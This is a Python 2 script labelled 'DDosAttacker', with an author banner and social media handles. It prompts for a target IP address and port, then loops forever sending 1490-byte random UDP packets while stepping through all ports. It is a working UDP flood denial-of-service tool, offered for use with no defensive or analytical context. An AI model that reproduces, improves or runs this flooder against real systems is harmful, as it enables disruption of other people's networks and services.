import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############
os.system('setterm -background grey -foreground green -store')


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'



os.system("clear")
os.system("figlet DDosAttacker") 
print "" + bcolors.OKBLUE

print """ BY  :                             
 |  \/  |                           | || |__ \ / _ \ 
 | \  / | __ ___  __ _______________| || |_ ) | | | |
 | |\/| |/ _` \ \/ /|_  /_  /_  /_  /__   _/ /| | | |
 | |  | | (_| |>  <  / / / / / / / /   | |/ /_| |_| |
 |_|  |_|\__,_/_/\_\/___/___/___/___|  |_|____|\___/ 
                                                     
                                    """  + bcolors.OKBLUE
print "TikTok : Maxzzzz420" + bcolors.OKGREEN
print "github   : https://github.com/maxzzzz420" + bcolors.HEADER
print "YouTube :  https://www.youtube.com/channel/UCZX4AfKOw5qmYQZhtRTn74Q" + bcolors.FAIL
print "Instagram : Maxzzzz420"
print bcolors.FAIL
ip = raw_input("IP Adress : ")
port = input("Port 8080 Default      : ")

os.system("clear")
os.system("figlet Attack Starting")

print """ WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWMWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNNNNNNWWWWWWWWWWWWWWWWNNNNWWWWWWWWWWWW
WWWWWWWWWWWXOdlllllloKWWWNOdolllccccccclllokXWN0dolllcccccllllox0NWWWW
WWWWWWWWXOo:,'',,''';kWWNx,'',:cccccccc:,'',dXx,'''',,,,,,,''''';kWWWW
WWWWWN0dc,'';lx0k;'';kWWXd;,;oKNNNNNNNNKo'''oOl''';d00KKK00Oo;'''oNWWW
WWWNOl,'',lx0NWW0:'';kWWWX0kxkOkkkxxxddl;'''d0c'''lXWWWWWWWWKc'''oXWWW
WWWXo''':dO0KKKKx;'',d0KNKo;,'''''''',,,,;cdKKc'''oXWWWWWWWWKc'''oXWWW
WWWXo''',,,,,,,,,'''',,:xd,'';dkkkOOOO00KKXWWKl''':OXNNNNNNXk;'''oNWWW
WWWNOdddddddddddl,'',cdxOo''';llllllllllllllx0d,''',:cccccc:,''',xNWWW
WWWWWWWWWWWWWWWWKl;;c0WWNx:::::;;;;;;::::::;lKXxl:;;;;;;;;;;;::lkXWWWW
WWWWWWWWWWWWWWWWWNXXXNWWWNXXXXXXXXXXXXXXXXXXNWWWWNXXXKKKKKKXXXNWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWMWWWWWWWWMWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW

"""
time.sleep(5)

sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

